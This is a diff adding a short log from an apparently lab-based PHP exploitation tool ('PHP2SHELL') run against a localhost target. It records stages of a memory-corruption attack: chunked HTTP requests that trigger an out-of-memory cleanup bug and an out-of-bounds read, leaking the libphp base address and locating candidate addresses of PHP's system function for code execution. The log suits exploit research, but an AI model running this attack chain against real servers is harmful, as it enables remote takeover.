@@ -1,0 +1,12 @@
+
+=== 2026-10-23T03:02:07.691266+00:00 ===
+=== PHP2SHELL official target — pure HTTP ===
+target: http://127.0.0.1:18110/index.php
+outdir: /home/ravhi/randoman/deepjb/php2shell-lab/official-lab/out
+[*] leak-only: A1 + B1 (runtime address resolution)
+      A1 body generated; sending chunked END-cleanup OOM
+      B1 body generated; sending chunked stale-id OOB read
+      decoded=819208 zval_ptr_dtor=0x7f7ef2d1fb60 -> libphp=0x7f7ef26c1000
+      chunk buckets: [('0x7f7ef0400000', 7495), ('0x7f7ef2c00000', 1095), ('0x7f7ef0a00000', 87), ('0x7f7ef0200000', 79)]
+      main candidates: 0x7f7ef0a00000(87), 0x7f7ef0200000(79)
+      zif_system candidates: 0x7f7ef2b26370, 0x7f7ef2b26370
